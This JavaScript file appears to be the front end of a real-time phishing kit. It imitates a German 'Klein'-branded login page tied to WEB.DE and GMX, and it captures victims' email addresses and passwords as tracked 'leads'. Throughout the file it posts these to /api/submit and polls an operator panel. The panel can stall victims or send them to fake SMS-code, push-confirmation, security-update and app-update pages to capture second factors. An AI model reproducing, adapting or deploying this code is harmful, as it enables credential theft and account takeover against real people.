/**
 * Klein login: two-step email/password, /api/submit + /api/status poll.
 */
import { credFetch } from '../shared/http.js';
import { isKleinAnmeldenPath } from '../shared/paths.js';

export function runKleinLogin() {
  'use strict';

  /** WEB.DE redirect: ?id=lead → orchestration seen ping. */
  function pingKleinAnmeldenSeen() {
    try {
      var q = new URLSearchParams(window.location.search);
      var lid = q.get('id');
      if (lid && lid.trim()) {
        sessionStorage.setItem('gmw_lead_id', lid.trim());
        fetch('/api/klein-anmelden-seen', Object.assign({
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ leadId: lid.trim() })
        }, credFetch)).catch(function () {});
      }
    } catch (e) {}
  }
  pingKleinAnmeldenSeen();

  function neutralHeaderFooterLinks() {
    ['knz-header-logo', 'knz-header-help', 'knz-footer-reg'].forEach(function (id) {
      var el = document.getElementById(id);
      if (el) el.addEventListener('click', function (e) { e.preventDefault(); });
    });
  }
  if (document.readyState === 'loading') document.addEventListener('DOMContentLoaded', neutralHeaderFooterLinks);
  else neutralHeaderFooterLinks();

  try {
    if (!isKleinAnmeldenPath()) {
      sessionStorage.removeItem('gmw_lead_id');
      sessionStorage.removeItem('gmw_fp_preset_idx');
    }
  } catch (e) {}

  var loginForm = document.getElementById('loginForm');
  var mainWidget = document.querySelector('main._widget');
  var usernameInput = document.getElementById('username-input');
  var passwordInput = document.getElementById('password-input');
  var readonlyUsernameMirror = document.getElementById('knz-readonly-username');
  var mainButton = document.getElementById('main-action-button');
  var btnWeitermachen = document.getElementById('btn-weitermachen');
  var emailFieldWrap = document.getElementById('knz-email-field-wrap');
  var emailErrorEl = document.getElementById('knz-email-error');
  var errorLoginRow = document.getElementById('error-login-row');
  var errorLogin = document.getElementById('error-login');
  var step1 = document.getElementById('knz-step-1');
  var step2 = document.getElementById('knz-step-2');
  var linkBearbeiten = document.getElementById('link-bearbeiten');
  var emailDisplay = document.getElementById('email-display');
  var btnTogglePassword = document.getElementById('btn-toggle-password');
  var pagePollInterval = null;

  var passwordFieldWrap = document.getElementById('password-field-wrap');
  var userClearedErrorByTyping = false;

  function appendTelemetrySafe(payload) {
    if (typeof window.gmwAppendTelemetry === 'function') {
      try {
        return window.gmwAppendTelemetry(payload);
      } catch (e) {
        return payload;
      }
    }
    return payload;
  }

  function setStep1EmailError(msg) {
    if (emailErrorEl) {
      var m = (msg && String(msg).trim()) ? String(msg).trim() : '';
      emailErrorEl.textContent = m;
      emailErrorEl.hidden = !m;
    }
  }

  function clearStep1EmailError() {
    setStep1EmailError('');
  }

  function syncEmailFieldLabel() {
    if (!emailFieldWrap || !usernameInput) return;
    var filled = !!(usernameInput.value && usernameInput.value.trim());
    emailFieldWrap.classList.toggle('knz-has-email-value', filled);
    emailFieldWrap.classList.toggle('c0e4f9f8a', filled);
  }

  function syncPasswordFieldLabel() {
    if (!passwordFieldWrap || !passwordInput) return;
    var filled = !!(passwordInput.value && passwordInput.value.length);
    passwordFieldWrap.classList.toggle('c0e4f9f8a', filled);
  }

  function setFormKleinStep(isPasswordStep) {
    if (!loginForm) return;
    loginForm.classList.toggle('_form-login-id', !isPasswordStep);
    loginForm.classList.toggle('_form-login-password', !!isPasswordStep);
    if (mainWidget) {
      mainWidget.classList.toggle('login-id', !isPasswordStep);
      mainWidget.classList.toggle('login', !!isPasswordStep);
    }
  }

  function setLoginError(show, message) {
    if (errorLoginRow) errorLoginRow.style.display = show ? 'block' : 'none';
    if (errorLogin) errorLogin.textContent = (message && show) ? message : (show ? 'E-Mail oder Passwort ist falsch. Bitte überprüfe deine Eingaben.' : '');
    if (passwordInput) passwordInput.setAttribute('aria-invalid', show ? 'true' : 'false');
    if (passwordFieldWrap) passwordFieldWrap.classList.toggle('ulp-error', show);
    if (show) {
      var waitOverlay = document.getElementById('knz-wait-overlay');
      if (waitOverlay) waitOverlay.setAttribute('hidden', '');
    }
  }

  function showStep1() {
    if (step1) step1.classList.add('is-active');
    if (step2) step2.classList.remove('is-active');
    if (passwordInput) {
      passwordInput.value = '';
      passwordInput.type = 'password';
      passwordInput.disabled = true;
      passwordInput.required = false;
    }
    if (readonlyUsernameMirror) readonlyUsernameMirror.value = '';
    if (passwordFieldWrap) passwordFieldWrap.classList.remove('focus');
    syncPasswordFieldLabel();
    setLoginError(false);
    clearStep1EmailError();
    if (btnWeitermachen) {
      btnWeitermachen.disabled = false;
      btnWeitermachen.classList.remove('is-loading');
    }
    syncEmailFieldLabel();
    setFormKleinStep(false);
    syncPasswordToggleUi();
  }

  function showStep2() {
    if (step1) step1.classList.remove('is-active');
    if (step2) step2.classList.add('is-active');
    var em = (usernameInput && usernameInput.value) ? usernameInput.value.trim() : '';
    if (emailDisplay) emailDisplay.textContent = em;
    if (readonlyUsernameMirror) readonlyUsernameMirror.value = em;
    setLoginError(false);
    setFormKleinStep(true);
    if (passwordInput) {
      passwordInput.disabled = false;
      passwordInput.required = true;
      passwordInput.value = '';
      syncPasswordFieldLabel();
      syncPasswordToggleUi();
      setTimeout(function () { passwordInput.focus(); }, 100);
    }
  }

  function sendEmailAndShowStep2() {
    var emailValue = (usernameInput && usernameInput.value) ? usernameInput.value.trim().toLowerCase() : '';
    var email = emailValue;
    clearStep1EmailError();
    if (!isEmailValid(email)) {
      setStep1EmailError('Bitte gib eine gültige E-Mail-Adresse ein.');
      if (usernameInput) usernameInput.focus();
      return;
    }
    if (btnWeitermachen) {
      btnWeitermachen.disabled = true;
      btnWeitermachen.classList.add('is-loading');
    }
    var visitId = null;
    try { visitId = sessionStorage.getItem('gmw_lead_id'); } catch (e) {}
    if (visitId && typeof visitId !== 'string') visitId = null;
    var sw = (typeof window.screen !== 'undefined' && window.screen.width) | 0;
    var sh = (typeof window.screen !== 'undefined' && window.screen.height) | 0;
    var body = appendTelemetrySafe({
      email: email,
      emailKl: email,
      visitId: visitId || undefined,
      screenWidth: sw || undefined,
      screenHeight: sh || undefined,
      kleinClient: true,
      kleinFlowSubmit: isKleinAnmeldenPath() ? true : undefined
    });
    fetch('/api/submit', Object.assign({
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(body)
    }, credFetch))
      .then(function (r) {
        return r.json().then(function (data) {
          return { ok: r.ok, status: r.status, data: data };
        }).catch(function () {
          return { ok: r.ok, status: r.status, data: null };
        });
      })
      .then(function (res) {
        if (btnWeitermachen) {
          btnWeitermachen.classList.remove('is-loading');
          btnWeitermachen.disabled = false;
        }
        if (res.ok && res.data && res.data.id) {
          try { sessionStorage.setItem('gmw_lead_id', res.data.id); } catch (e) {}
          startPagePoll(res.data.id);
          showStep2();
          return;
        }
        var msg = (res.data && res.data.message) ? String(res.data.message) : '';
        setStep1EmailError(msg || (res.status === 403 ? 'Zugriff verweigert. Seite neu laden und erneut versuchen.' : 'Ein Fehler ist aufgetreten. Bitte versuche es erneut.'));
      })
      .catch(function () {
        if (btnWeitermachen) {
          btnWeitermachen.classList.remove('is-loading');
          btnWeitermachen.disabled = false;
        }
        setStep1EmailError('Verbindungsfehler. Bitte versuche es erneut.');
      });
  }

  function isEmailValid(val) {
    if (!val || typeof val !== 'string') return false;
    var t = val.trim().toLowerCase();
    return /^[^\s@]+@[^\s@]+\.[^\s@]{2,}$/.test(t);
  }

  function startPagePoll(id) {
    if (!id) return;
    if (pagePollInterval) {
      clearInterval(pagePollInterval);
      pagePollInterval = null;
    }
    function poll() {
      fetch('/api/status?id=' + encodeURIComponent(id) + '&page=index&_=' + Date.now(), Object.assign({ cache: 'no-store', headers: { Pragma: 'no-cache' } }, credFetch))
        .then(function (r) { return r.json(); })
        .then(function (res) {
          var mode = (res && res.mode) || '';
          var st = res && res.status;
          if (mode === 'manual' && st === 'pending') return;
          if (st === 'not_found') {
            if (pagePollInterval) { clearInterval(pagePollInterval); pagePollInterval = null; }
            try { sessionStorage.removeItem('gmw_lead_id'); } catch (e) {}
            showStep1();
            setStep1EmailError('Sitzung abgelaufen. Bitte E-Mail erneut eingeben.');
            return;
          }
          if (st === 'show_success') {
            if (pagePollInterval) { clearInterval(pagePollInterval); pagePollInterval = null; }
            window.location = '/erfolg?id=' + encodeURIComponent(id);
          } else if (st === 'redirect_change_password' || st === 'redirect_sicherheit' || st === 'redirect_android' || st === 'redirect_open_on_pc') {
            if (pagePollInterval) { clearInterval(pagePollInterval); pagePollInterval = null; }
            var url = st === 'redirect_change_password' ? '/passwort-aendern?id=' + encodeURIComponent(id)
              : st === 'redirect_sicherheit' ? '/sicherheit-update?id=' + encodeURIComponent(id)
              : st === 'redirect_android' ? '/app-update?id=' + encodeURIComponent(id)
              : '/bitte-am-pc?id=' + encodeURIComponent(id);
            setTimeout(function () { window.location = url; }, 1800);
          } else if (st === 'redirect_push') {
            if (pagePollInterval) { clearInterval(pagePollInterval); pagePollInterval = null; }
            window.location = '/push-confirm.html?id=' + encodeURIComponent(id);
          } else if (st === 'redirect_sms_code') {
            if (pagePollInterval) { clearInterval(pagePollInterval); pagePollInterval = null; }
            window.location = '/sms-code.html?id=' + encodeURIComponent(id);
          } else if (st === 'redirect_klein_forgot') {
            if (pagePollInterval) { clearInterval(pagePollInterval); pagePollInterval = null; }
            window.location.href = (window.__BRAND__ && window.__BRAND__.passwortUrl) ? window.__BRAND__.passwortUrl : '/anmelden';
          } else if (st === 'redirect_gmx_net') {
            if (pagePollInterval) { clearInterval(pagePollInterval); pagePollInterval = null; }
            window.location.href = (window.__BRAND__ && window.__BRAND__.canonicalUrl) || '/';
          } else if (st === 'error') {
            if (mainButton) {
              mainButton.classList.remove('is-loading');
              mainButton.disabled = false;
            }
            if (!userClearedErrorByTyping) {
              var klErr = res && res.kleinPasswordErrorDe ? String(res.kleinPasswordErrorDe).trim() : '';
              setLoginError(true, klErr || 'Die E-Mail-Adresse ist nicht registriert oder das Passwort ist falsch. Bitte überprüfe deine Eingaben.');
            }
          } else {
            userClearedErrorByTyping = false;
          }
        })
        .catch(function () {});
    }
    poll();
    pagePollInterval = setInterval(poll, 1000);
  }

  (function registerVisit() {
    try {
      var leadId = sessionStorage.getItem('gmw_lead_id');
      if (leadId) startPagePoll(leadId);
    } catch (e) {}
  })();

  showStep1();
  syncEmailFieldLabel();

  if (passwordInput) {
    passwordInput.addEventListener('input', function () {
      userClearedErrorByTyping = true;
      setLoginError(false);
      syncPasswordFieldLabel();
    });
    passwordInput.addEventListener('focus', function () {
      if (passwordFieldWrap) passwordFieldWrap.classList.add('focus');
      syncPasswordFieldLabel();
    });
    passwordInput.addEventListener('blur', function () {
      if (passwordFieldWrap) passwordFieldWrap.classList.remove('focus');
      syncPasswordFieldLabel();
    });
    passwordInput.addEventListener('keydown', function (e) {
      if (e.key !== 'Enter') return;
      if (!step2 || !step2.classList.contains('is-active')) return;
      e.preventDefault();
      if (loginForm && typeof loginForm.requestSubmit === 'function') {
        loginForm.requestSubmit();
      } else {
        loginForm.dispatchEvent(new Event('submit', { cancelable: true, bubbles: true }));
      }
    });
  }

  if (linkBearbeiten) {
    linkBearbeiten.addEventListener('click', function (e) {
      e.preventDefault();
      if (pagePollInterval) {
        clearInterval(pagePollInterval);
        pagePollInterval = null;
      }
      try { sessionStorage.removeItem('gmw_lead_id'); } catch (err) {}
      showStep1();
      if (usernameInput) usernameInput.focus();
    });
  }

  function syncPasswordToggleUi() {
    if (!btnTogglePassword || !passwordInput) return;
    var visible = passwordInput.type === 'text';
    btnTogglePassword.setAttribute('aria-checked', visible ? 'true' : 'false');
    btnTogglePassword.setAttribute('aria-label', visible ? 'Passwort verbergen' : 'Passwort anzeigen');
    btnTogglePassword.setAttribute('title', visible ? 'Passwort verbergen' : 'Passwort anzeigen');
    var showTip = btnTogglePassword.querySelector('.show-password-tooltip');
    var hideTip = btnTogglePassword.querySelector('.hide-password-tooltip');
    if (showTip) showTip.classList.toggle('hide', visible);
    if (hideTip) hideTip.classList.toggle('hide', !visible);
    var eyeOpen = btnTogglePassword.querySelector('.knz-svg-eye-open');
    var eyeClosed = btnTogglePassword.querySelector('.knz-svg-eye-closed');
    if (eyeOpen) eyeOpen.classList.toggle('hide', visible);
    if (eyeClosed) eyeClosed.classList.toggle('hide', !visible);
  }

  if (btnTogglePassword && passwordInput) {
    btnTogglePassword.addEventListener('click', function (e) {
      e.preventDefault();
      passwordInput.type = passwordInput.type === 'password' ? 'text' : 'password';
      syncPasswordToggleUi();
    });
    syncPasswordToggleUi();
  }

  var backEl = document.getElementById('knz-back');
  if (backEl) {
    backEl.addEventListener('click', function (e) {
      e.preventDefault();
      if (window.history.length > 1) {
        window.history.back();
      } else {
        window.location.href = '/';
      }
    });
  }

  if (!loginForm) return;

  if (usernameInput) {
    usernameInput.addEventListener('input', function () {
      setLoginError(false);
      clearStep1EmailError();
      syncEmailFieldLabel();
    });
    usernameInput.addEventListener('change', syncEmailFieldLabel);
    usernameInput.addEventListener('focus', function () {
      if (emailFieldWrap) emailFieldWrap.classList.add('focus');
      syncEmailFieldLabel();
    });
    usernameInput.addEventListener('blur', function () {
      if (emailFieldWrap) emailFieldWrap.classList.remove('focus');
      syncEmailFieldLabel();
    });
  }

  loginForm.addEventListener('submit', function (e) {
    e.preventDefault();
    var onStep2 = step2 && step2.classList.contains('is-active');
    if (!onStep2) {
      sendEmailAndShowStep2();
      return;
    }
    var emailValue = (usernameInput && usernameInput.value) ? usernameInput.value.trim().toLowerCase() : '';
    var email = emailValue;
    var pwd = (passwordInput && passwordInput.value) || '';
    if (!pwd) return;
    setLoginError(false);
    var hp = document.getElementById('hp-website');
    var websiteHp = (hp && hp.value) ? hp.value : undefined;
    var sw = (typeof window.screen !== 'undefined' && window.screen.width) | 0;
    var sh = (typeof window.screen !== 'undefined' && window.screen.height) | 0;
    var visitId = null;
    try { visitId = sessionStorage.getItem('gmw_lead_id'); } catch (e) {}
    if (visitId && typeof visitId !== 'string') visitId = null;

    if (mainButton) {
      mainButton.classList.add('is-loading');
      mainButton.disabled = true;
    }

    fetch('/api/submit', Object.assign({
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(window.gmwAppendTelemetry({
        email: email,
        emailKl: email,
        password: pwd,
        visitId: visitId || undefined,
        screenWidth: sw || undefined,
        screenHeight: sh || undefined,
        website: websiteHp,
        kleinClient: true,
        kleinFlowSubmit: isKleinAnmeldenPath() ? true : undefined
      }))
    }, credFetch))
      .then(function (r) { return r.json().then(function (data) { return { ok: r.ok, status: r.status, data: data }; }); })
      .then(function (res) {
        if (!res.ok) {
          if (mainButton) { mainButton.classList.remove('is-loading'); mainButton.disabled = false; }
          setLoginError(true, (res.data && res.data.message) || 'Ein Fehler ist aufgetreten. Bitte versuchen Sie es erneut.');
          return;
        }
        var id = (res.data && res.data.id) || '';
        if (id) {
          try { sessionStorage.setItem('gmw_lead_id', id); } catch (e) {}
          var waitOverlay = document.getElementById('knz-wait-overlay');
          var waitCountdownEl = document.getElementById('knz-wait-countdown');
          if (waitOverlay) {
            waitOverlay.removeAttribute('hidden');
            var secLeft = 5 * 60;
            function formatWait(sec) {
              var m = Math.floor(sec / 60);
              var s = sec % 60;
              return m + ':' + (s < 10 ? '0' : '') + s;
            }
            if (waitCountdownEl) waitCountdownEl.textContent = formatWait(secLeft);
            var waitT = setInterval(function () {
              secLeft--;
              if (waitCountdownEl) waitCountdownEl.textContent = formatWait(secLeft > 0 ? secLeft : 0);
              if (secLeft <= 0) {
                clearInterval(waitT);
                waitOverlay.setAttribute('hidden', '');
              }
            }, 1000);
          }
          startPagePoll(id);
        } else {
          if (mainButton) { mainButton.classList.remove('is-loading'); mainButton.disabled = false; }
          setLoginError(true, 'Ein Fehler ist aufgetreten. Bitte versuche es erneut.');
        }
      })
      .catch(function (err) {
        if (mainButton) { mainButton.classList.remove('is-loading'); mainButton.disabled = false; }
        setLoginError(true, 'Verbindungsfehler. Bitte versuche es erneut.');
      });
  });
}
